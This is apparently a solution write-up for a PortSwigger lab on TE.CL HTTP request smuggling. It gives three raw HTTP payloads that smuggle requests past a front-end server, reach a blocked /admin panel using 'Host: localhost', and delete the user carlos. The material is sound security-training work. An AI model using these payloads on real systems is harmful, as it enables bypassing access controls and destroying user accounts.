
# Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.

Note: Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip: Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


---------------------------------------------

References: 

- https://portswigger.net/web-security/request-smuggling/exploiting



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls,%20TE.CL%20vulnerability/1.png)

---------------------------------------------

First we can test a previously used payload to generate a request with GPOST, finding it generates an error every 2 requests:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

26
GPOST / HTTP/1.1
Content-Length: 10

0


```



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls,%20TE.CL%20vulnerability/2.png)


Then we can adapt the payload to access /admin using the header “Host: localhost” as previously:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

3a
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

0


```



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls,%20TE.CL%20vulnerability/3.png)


And finally delete the user “carlos”:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

3a
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 10

0


```



![img](images/Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls,%20TE.CL%20vulnerability/4.png)

